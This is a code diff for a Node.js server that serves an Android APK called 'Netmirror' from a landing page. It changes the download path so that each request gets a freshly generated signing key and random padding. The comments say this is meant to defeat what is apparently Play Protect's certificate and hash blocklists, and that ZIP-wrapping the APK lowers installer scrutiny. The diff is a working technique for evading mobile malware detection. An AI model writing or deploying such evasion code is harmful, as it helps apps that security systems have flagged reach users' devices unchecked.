@@ -385,56 +385,52 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   //   5. Does NOT touch V1 files — preserves original prefix/order/timestamps
   //   Result: 0 entries changed (if clean) or 1 entry changed (if FGS patched)
   //
-  // Cached for 30 minutes (output is deterministic for same input).
-  let _landingRotationCache = { buffer: null, timestamp: 0 };
-  const LANDING_ROTATION_TTL = 30 * 60 * 1000; // 30 minutes
-  let _landingRotationInProgress = null; // promise lock
+  // ═══ PER-DOWNLOAD UNIQUE APK ═══
+  // Each download gets: fresh RSA key (unique cert fingerprint) + random signing
+  // block padding (unique APK SHA-256). This defeats both PP's cert blocklist
+  // and hash blocklist. No caching — each request produces a one-of-a-kind APK.
+  //
+  // Performance: ~1-2 seconds per download (key gen + patch + sign).
+  // For a landing page with low traffic, this is perfectly acceptable.
+  //
+  // Cache the SOURCE APK buffer (read from disk) to avoid repeated disk reads.
+  let _sourceApkCache = { buffer: null, timestamp: 0 };
+  const SOURCE_APK_CACHE_TTL = 30 * 60 * 1000; // 30 minutes
+
+  async function getSourceApk() {
+    const now = Date.now();
+    if (_sourceApkCache.buffer && (now - _sourceApkCache.timestamp) < SOURCE_APK_CACHE_TTL) {
+      return _sourceApkCache.buffer;
+    }
+    const dataDir = path.join(__dirname, 'data');
+    const originalPath = path.join(dataDir, 'Netmirror-original.apk');
+    const securePath = path.join(dataDir, 'Netmirror-secure.apk');
+    const regularPath = path.join(dataDir, 'Netmirror.apk');
+
+    let sourceBuf = null;
+    if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
+    else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
+    else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
+
+    if (!sourceBuf) {
+      await ensureApkAvailable();
+      if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
+      else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
+      else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
+    }
+    if (!sourceBuf) throw new Error('No base APK available');
+    _sourceApkCache = { buffer: sourceBuf, timestamp: now };
+    return sourceBuf;
+  }
 
   async function getLandingRotatedApk() {
-    const now = Date.now();
-    // Return cached if still fresh
-    if (_landingRotationCache.buffer && (now - _landingRotationCache.timestamp) < LANDING_ROTATION_TTL) {
-      return _landingRotationCache.buffer;
-    }
-    // If already in progress, wait
-    if (_landingRotationInProgress) {
-      return _landingRotationInProgress;
-    }
-    // Start minimal restore
-    _landingRotationInProgress = (async () => {
-      try {
-        const dataDir = path.join(__dirname, 'data');
-        const originalPath = path.join(dataDir, 'Netmirror-original.apk');
-        const securePath = path.join(dataDir, 'Netmirror-secure.apk');
-        const regularPath = path.join(dataDir, 'Netmirror.apk');
-
-        let sourceBuf = null;
-        if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
-        else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
-        else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
-
-        if (!sourceBuf) {
-          await ensureApkAvailable();
-          if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
-          else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
-          else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
-        }
-
-        if (!sourceBuf) throw new Error('No base APK available');
-
-        console.log('[Landing Download] Starting direct binary patch (no AdmZip)...');
-        const t0 = Date.now();
-        const { buffer: restoredBuf } = directPatchApk(sourceBuf);
-        const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
-        console.log(`[Landing Download] Done: ${(restoredBuf.length / 1024 / 1024).toFixed(1)} MB in ${elapsed}s`);
-
-        _landingRotationCache = { buffer: restoredBuf, timestamp: Date.now() };
-        return restoredBuf;
-      } finally {
-        _landingRotationInProgress = null;
-      }
-    })();
-    return _landingRotationInProgress;
+    const sourceBuf = await getSourceApk();
+    console.log('[Landing Download] Generating unique APK (fresh key + entropy)...');
+    const t0 = Date.now();
+    const { buffer: uniqueBuf } = directPatchApk(sourceBuf);
+    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+    console.log(`[Landing Download] Unique APK ready: ${(uniqueBuf.length / 1024 / 1024).toFixed(1)} MB in ${elapsed}s`);
+    return uniqueBuf;
   }
 
   // ═══ ZIP WRAPPER FOR LANDING DOWNLOADS ═══
@@ -443,18 +439,12 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // When user extracts APK via file manager and installs, installerPackage is the
   // file manager (e.g. com.google.android.documentsui) → LOW scrutiny = same as
   // LeaksProAdmin's DownloadManager approach.
-  let _landingZipCache = { buffer: null, forTimestamp: 0 };
-
+  // ZIP wrapper — also per-download unique (wraps the unique APK)
   async function getLandingRotatedZip() {
     const apkBuf = await getLandingRotatedApk();
-    // Return cached ZIP if built from the same rotation
-    if (_landingZipCache.buffer && _landingZipCache.forTimestamp === _landingRotationCache.timestamp) {
-      return _landingZipCache.buffer;
-    }
-    console.log('[Landing Download] Creating ZIP wrapper for rotated APK...');
+    console.log('[Landing Download] Wrapping unique APK in ZIP...');
     const zipBuf = wrapApkInZip(apkBuf);
     console.log(`[Landing Download] ZIP ready: ${(zipBuf.length / 1024 / 1024).toFixed(1)} MB`);
-    _landingZipCache = { buffer: zipBuf, forTimestamp: _landingRotationCache.timestamp };
     return zipBuf;
   }
 
